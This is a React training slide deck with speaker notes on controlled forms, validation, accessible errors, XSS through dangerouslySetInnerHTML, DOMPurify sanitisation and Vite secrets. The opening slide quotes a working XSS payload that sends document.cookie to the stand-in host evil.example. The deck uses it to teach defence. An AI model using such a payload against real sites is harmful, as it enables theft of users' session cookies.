---
title: "Session 7 — Forms, Validation, and Security"
sub_title: React for .NET/Blazor Developers — Day 2
author: Kevin Cunningham
---

## Opening scenario

A colleague adds a "Submit a tool" form to the ToolDirectory. It collects a tool name and description. Before it ships, a security review flags it.

The description field renders user input with `dangerouslySetInnerHTML`. Someone submits this as a description:

```
<img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">
```

It works.

**Type in chat: what would you change, and where does the responsibility sit — React, the developer, or the server?**

<!--
speaker_note: |
  Let the room sit with this for a moment. It's a real class of bug — XSS via
  dangerouslySetInnerHTML is one of the most common React security mistakes.
  Expected answers — "don't use dangerouslySetInnerHTML", "sanitise the input",
  "the server should validate too". All correct. The session covers each one.
  The goal isn't alarm — it's to make clear that React's JSX escaping is not
  a complete solution and developers need to understand where the boundaries are.
-->

<!-- end_slide -->

## Controlled forms — the React model

You've seen controlled inputs. A form is just multiple controlled inputs working together.

```tsx
import { useState } from "react";

interface ToolFormData {
  name: string;
  owner: string;
  category: string;
}

function AddToolForm() {
  const [form, setForm] = useState<ToolFormData>({
    name: "",
    owner: "",
    category: "devops",
  });

  function handleChange(e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) {
    setForm({ ...form, [e.target.name]: e.target.value });
  }

  function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    console.log("submitted", form);
  }

  return (
    <form onSubmit={handleSubmit}>
      <label htmlFor="name">Tool name</label>
      <input id="name" name="name" value={form.name} onChange={handleChange} />

      <label htmlFor="owner">Owner</label>
      <input id="owner" name="owner" value={form.owner} onChange={handleChange} />

      <button type="submit">Add tool</button>
    </form>
  );
}
```

<!-- pause -->

`[e.target.name]` — computed property key. One handler for every field.

<!--
speaker_note: |
  The computed property key pattern is the idiomatic React approach for multi-field
  forms. Each input's `name` attribute maps to the matching key in the form state
  object. One onChange handler, no repetition. Point it out explicitly — it's
  a JavaScript pattern that often gets missed.
  This is the same as Blazor's @bind but fully explicit — you see both directions
  (value in, onChange out) rather than having the framework handle it silently.
-->

<!-- end_slide -->

## TypeScript for form state

TypeScript tightens the form model — invalid states become compile errors.

<!-- column_layout: [1, 1] -->

<!-- column: 0 -->

**Typed form state**

```tsx
interface ToolFormData {
  name: string;
  owner: string;
  category: "devops" | "product" | "support" | "data";
}

const [form, setForm] = useState<ToolFormData>({
  name: "",
  owner: "",
  category: "devops",
});
```

<!-- pause -->

**Typed change handler**

```tsx
function handleChange(
  e: React.ChangeEvent<
    HTMLInputElement | HTMLSelectElement
  >
) {
  const { name, value } = e.target;
  setForm((prev) => ({ ...prev, [name]: value }));
}
```

<!-- column: 1 -->

<!-- pause -->

**Why the functional update form?**

```tsx
// This can stale-close over form:
setForm({ ...form, [name]: value });

// This always gets the latest state:
setForm((prev) => ({ ...prev, [name]: value }));
```

<!-- pause -->

If two fields update in quick succession — or inside a `useEffect` — the first version may overwrite the second because it captured an old `form`. The functional form always starts from the latest state.

<!-- reset_layout -->

<!--
speaker_note: |
  The stale closure in setForm is subtle and worth spending a moment on. In
  practice, with simple forms and no concurrent updates, it rarely bites — but
  it's the correct pattern and builds the right habit. If anyone asks why their
  form loses a field value in a more complex case, this is often the cause.
-->

<!-- end_slide -->

<!-- jump_to_middle -->

Validation
===

<!-- end_slide -->

## Client-side validation

Validate before submit. Give specific, actionable feedback — not just "form is invalid".

```tsx
interface FormErrors {
  name?: string;
  owner?: string;
}

function validate(form: ToolFormData): FormErrors {
  const errors: FormErrors = {};

  if (!form.name.trim()) {
    errors.name = "Tool name is required.";
  } else if (form.name.trim().length < 3) {
    errors.name = "Tool name must be at least 3 characters.";
  }

  if (!form.owner.trim()) {
    errors.owner = "Owner is required.";
  }

  return errors;
}

function handleSubmit(e: React.FormEvent) {
  e.preventDefault();
  const errors = validate(form);
  if (Object.keys(errors).length > 0) {
    setErrors(errors);
    return;
  }
  // proceed with submission
}
```

<!-- pause -->

`validate` is a pure function — no side effects, easy to test.

<!--
speaker_note: |
  The pure validate function is worth emphasising. It takes data in, returns
  errors out. No DOM, no state, no side effects. You can unit-test it with a
  simple object — no rendering required. That's the design to aim for.
  Client-side validation is for UX, not security. The server must validate too.
  Mention this now, return to it in the sanitisation section.
-->

<!-- end_slide -->

## Accessible error messages

Errors that only appear visually are invisible to screen reader users.

<!-- column_layout: [1, 1] -->

<!-- column: 0 -->

**The pattern**

```tsx
<div>
  <label htmlFor="name">Tool name</label>
  <input
    id="name"
    name="name"
    value={form.name}
    onChange={handleChange}
    aria-describedby={errors.name ? "name-error" : undefined}
    aria-invalid={!!errors.name}
  />
  {errors.name && (
    <p id="name-error" role="alert">
      {errors.name}
    </p>
  )}
</div>
```

<!-- column: 1 -->

<!-- pause -->

Three things working together:

<!-- incremental_lists: true -->

- `aria-invalid` — tells the screen reader the field has an error
- `aria-describedby` — links the input to its error message by ID
- `role="alert"` — announces the error immediately when it appears, without the user having to navigate to it

<!-- incremental_lists: false -->

<!-- pause -->

Without these, a screen reader user submits the form, nothing happens, and they have no idea why.

<!-- reset_layout -->

<!--
speaker_note: |
  This is the WCAG AA minimum for form errors. The three attributes work as a
  unit — don't use one without the others. The id on the error paragraph must
  match the aria-describedby value exactly. If in doubt, test with VoiceOver
  (macOS, cmd+F5) or NVDA (Windows) — errors that work visually often fail
  completely with a screen reader.
-->

<!-- end_slide -->

## Validation UX — when to show errors

Showing errors before the user has had a chance to type is poor UX. Showing them too late is also bad.

<!-- column_layout: [1, 1] -->

<!-- column: 0 -->

**Validate on submit first**

Show no errors until the first submit attempt. After that, re-validate on change so the user sees errors clear as they fix them.

```tsx
const [submitted, setSubmitted] = useState(false);
const errors = submitted ? validate(form) : {};

function handleSubmit(e: React.FormEvent) {
  e.preventDefault();
  setSubmitted(true);
  const errs = validate(form);
  if (Object.keys(errs).length > 0) return;
  // submit
}
```

<!-- column: 1 -->

<!-- pause -->

**Move focus to the first error**

After a failed submit, move focus to the first error so keyboard and screen reader users know where to start:

```tsx
const firstErrorRef = useRef<HTMLParagraphElement>(null);

useEffect(() => {
  if (submitted && Object.keys(errors).length > 0) {
    firstErrorRef.current?.focus();
  }
}, [submitted, errors]);

// Attach to the first error paragraph:
<p
  ref={firstErrorRef}
  id="name-error"
  role="alert"
  tabIndex={-1}
>
  {errors.name}
</p>
```

<!-- reset_layout -->

<!--
speaker_note: |
  The submitted flag pattern avoids the common mistake of showing errors on an
  untouched form. The re-validate-on-change behaviour (errors clears as you fix)
  comes for free because errors is derived from form state — no extra logic needed.
  The focus move on failed submit is a WCAG 2.1 requirement. tabIndex={-1} makes
  the paragraph focusable programmatically without adding it to the tab order.
  Without the focus move, a keyboard user may not know errors appeared.
-->

<!-- end_slide -->

<!-- jump_to_middle -->

Security
===

<!-- end_slide -->

## Where React protects you

JSX escapes all values by default. This prevents most XSS attacks automatically.

<!-- column_layout: [1, 1] -->

<!-- column: 0 -->

**Safe — JSX escapes the value**

```tsx
const userInput = '<script>alert("xss")</script>';

// React renders this as literal text —
// the script tag is never executed
return <p>{userInput}</p>;
```

Output in the DOM:
```html
<p>&lt;script&gt;alert("xss")&lt;/script&gt;</p>
```

<!-- column: 1 -->

<!-- pause -->

**Unsafe — you asked React not to escape**

```tsx
const userInput = '<img src=x onerror="alert(1)">';

// dangerouslySetInnerHTML bypasses escaping entirely
return (
  <div
    dangerouslySetInnerHTML={{ __html: userInput }}
  />
);
```

The `onerror` handler runs. The name is a warning — React is telling you it's dangerous.

<!-- reset_layout -->

<!-- pause -->

**The rule:** never pass unsanitised user input to `dangerouslySetInnerHTML`. If you need to render user-supplied HTML, sanitise it first.

<!--
speaker_note: |
  The vast majority of React apps never need dangerouslySetInnerHTML. It exists
  for cases where you genuinely need to render server-supplied HTML — a rich text
  editor output, a CMS content field, markdown rendered to HTML. In those cases,
  sanitise before rendering. In all other cases, use JSX interpolation and let
  React escape for you.
-->

<!-- end_slide -->

## DOMPurify — sanitising user HTML

When you must render HTML from user input, sanitise it with DOMPurify before it reaches the DOM.

```bash
npm install dompurify
npm install --save-dev @types/dompurify
```

```tsx
import DOMPurify from "dompurify";

function ToolDescription({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html);

  return (
    <div dangerouslySetInnerHTML={{ __html: clean }} />
  );
}
```

<!-- pause -->

DOMPurify strips anything that could execute — event handlers, `<script>` tags, `javascript:` URLs. Safe tags like `<strong>`, `<em>`, `<p>` survive.

<!-- pause -->

```tsx
// You can restrict to a specific allowlist
const clean = DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ["b", "i", "em", "strong", "p"],
  ALLOWED_ATTR: [],
});
```

<!--
speaker_note: |
  DOMPurify is the de-facto standard for client-side HTML sanitisation. It's
  maintained by Cure53 (a security firm) and widely used. The allowlist approach
  is preferable to the blocklist — specifying what's safe is more robust than
  trying to enumerate what's dangerous.
  Remind them — sanitisation on the client is defence in depth, not the primary
  defence. The server must also validate and sanitise. If the server stores and
  re-serves unsanitised HTML, a client-side check is meaningless for other users
  who receive that content.
-->

<!-- end_slide -->

## Secrets management — what Vite exposes

Environment variables in Vite work differently from what .NET developers expect.

<!-- column_layout: [1, 1] -->

<!-- column: 0 -->

**The `.env` file**

```bash
# .env
VITE_API_URL=https://api.tools.internal
VITE_APP_TITLE=Internal Tools

# This is NOT sent to the browser
DB_PASSWORD=hunter2
API_SECRET_KEY=abc123
```

Only variables prefixed with `VITE_` are bundled into the client.

<!-- pause -->

**Reading them in code**

```tsx
const apiUrl = import.meta.env.VITE_API_URL;
```

<!-- column: 1 -->

<!-- pause -->

**What this means for security**

`VITE_` variables are compiled into your JavaScript bundle. Anyone who can load your app can read them.

<!-- pause -->

<!-- incremental_lists: true -->

- **Safe to put in `VITE_`** — public API base URLs, feature flag names, app titles
- **Never put in `VITE_`** — API secret keys, database credentials, private tokens, third-party API secrets

<!-- incremental_lists: false -->

<!-- pause -->

If a secret needs to be used with an external service, that call belongs on the **server** — not the client.

<!-- reset_layout -->

<!--
speaker_note: |
  This is a common mistake coming from .NET where appsettings.json is server-side
  config and never sent to the browser. In Vite, the VITE_ prefix is the explicit
  signal that "this value will be in the browser". Everything without the prefix
  stays out. The naming is the documentation.
  If they ask about .env.local vs .env — .env.local is gitignored by default and
  used for developer-specific values. .env is committed and shared. Secrets never
  go in either — they go in the deployment environment config (CI/CD secrets,
  Azure App Configuration, etc).
-->

<!-- end_slide -->

## Closing the loop — Session 7

Back to the opening. The `dangerouslySetInnerHTML` bug and where responsibility sits:

<!-- incremental_lists: true -->

- React escapes JSX interpolation — `{userInput}` is always safe
- `dangerouslySetInnerHTML` bypasses that protection — the name is the warning
- If you must render user HTML, run it through DOMPurify first
- Client-side sanitisation is defence in depth — the server must also validate
- API secrets never go in `VITE_` variables — they belong on the server

<!-- incremental_lists: false -->

<!-- pause -->

**Responsibility sits with the developer.** React protects you from one class of XSS by default. You are responsible for not opting out of that protection without compensating controls.

<!--
speaker_note: |
  The closing sentence is deliberately direct. React's defaults are good — JSX
  escaping removes the most common XSS vector. But developers can and do opt out
  with dangerouslySetInnerHTML, and without DOMPurify that's a critical vulnerability.
  The security answer isn't "React handles it" — it's "React handles JSX, I handle
  everything else."
-->

<!-- end_slide -->

## Session 7 summary

<!-- incremental_lists: true -->

1. **Controlled forms** — one `onChange` handler with a computed property key covers all fields
2. **Validate in a pure function** — no DOM, no side effects, easy to test
3. **Three attributes for accessible errors** — `aria-invalid`, `aria-describedby`, `role="alert"`
4. **Show errors on submit first** — then re-validate on change so errors clear as the user fixes them
5. **JSX escaping is automatic** — `dangerouslySetInnerHTML` opts out of it; never use it with unsanitised input
6. **`VITE_` variables are public** — secrets belong on the server, not in environment variables

<!-- incremental_lists: false -->

<!-- end_slide -->

## Bridge to Session 8

**The app can now collect, validate, and securely handle user input.**

<!-- incremental_lists: true -->

- Forms are controlled and typed
- Errors are visible and accessible
- Security boundaries are understood

<!-- incremental_lists: false -->

**Session 8 — Completing the App:** the last session of Day 2 brings everything together — shared state with `useContext`, CSS Modules for scoped styling, and a complete CRUD app with routing, a form, and fetched data. Then a Lighthouse walkthrough on the finished result.

<!-- end_slide -->

<!-- jump_to_middle -->

Questions?
===
